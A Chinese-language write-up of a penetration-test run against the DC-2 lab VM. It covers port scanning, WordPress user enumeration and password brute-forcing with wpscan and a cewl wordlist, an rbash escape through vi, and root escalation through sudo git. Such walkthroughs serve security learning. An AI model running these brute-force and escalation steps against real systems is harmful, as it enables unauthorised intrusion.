1.首先扫描主机
​
2.nmap -p- 192.168.89.140扫描后发现有80和7744两个端口
 nmap -p- 192.168.89.140       
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-12-09 23:11 CST
Nmap scan report for dc-2 (192.168.89.140)
Host is up (0.0014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  raqmon-pdu
MAC Address: 00:0C:29:FB:42:F6 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds
​
3.先去访问80端口，然后我这里先尝试用火绒插件识别版本，然后打算去exploit库查找对应内容，找到后发现msf框架里面实际上没有对应的脚本，看教程知道要扫描目录，发现了一个wp-login.php
[16:24:45] 200 -    0B  - /wp-cron.php                                      
[16:24:45] 200 -    1KB - /wp-login.php          
[16:24:45] 302 -    0B  - /wp-signup.php  ->  [http://dc-2/wp-login.php?action=register](http://dc-2/wp-login.php?action=register)
[16:24:46] 405 -   42B  - /xmlrpc.php   
打开后发现是个登录页面，然后这里就要想到DC-2的初始页面里面的那个flag1，提示我们要用到cewl这个东西，就是爬网站单词然后组成字典用于爆破的，这里就使用cewl [http://dc-2/](http://dc-2/) -w /home/sk57/dict.txt得到密码字典
​
4.然后用户名不知道，这里又知道了一个新软件wpscan，专门用于扫描WordPress的漏洞，同时也可以用于爆破WordPress账号密码的，先使用wpscan --url [http://dc-2/](http://dc-2/) -e u 收集账户名信息，得到下面这三个，然后把这
[+] admin
[+] jerry
[+] tom
三个放到一个文件里面，然后在使用wpscan --url [http://dc-2/](http://dc-2/) -U dc2uname.txt -P dict.txt进行爆破，成功爆破出账户和密码
[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
然后去网站登录后得到flag2，If you can't exploit WordPress and take a shortcut, there is another way.
Hope you found another entry point.  意思就是说还有另外的方法。
​
5.然后这里就想到还有一个端口没有去访问过7744端口 ，我们尝试用ssh jerry@192.168.89.140 -p 7744登录，发现始终无法登陆，然后尝试tom的，可以登录。但是这个权限实际上非常低，过滤很多命令，然后这里可以使用compgen -c 查看哪些命令可用，发现vi可用，然后使用vi这个编辑器进行部分权限提升，就是执行vi 1.txt(这里文件名随便取一个，或者不加也行)，然后进去后先按Esc确保是在命令模式，接着写入:set shell=/bin/bash和:shell然后就直接退出到页面，这时就发现已经把rbash提升到bash了，然后在添加环境变量就可以执行一些常见命令，然后得到flag3  .这里提到了su 应该就是要提权的意思。
​
6.然后这里就要去思考怎么去提权，然后在tom尝试sudo -l命令发现不行，那么切换到jerry用户，这里先查看目录下面有什么，发现了flag4.txt，说明还有最后一个flag，然后这里又提示的是git，那么大概率就是git提权了，我们先用sudo -l 查看可以sudo的命令有哪些，发现了User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git  ，那么我们就可以是用git提权，执行sudo git help config后再执行!/bin/bash后就能成功提权到root权限，然后查看root目录下有finalflag文件，至此，靶机渗透完成。
​

​
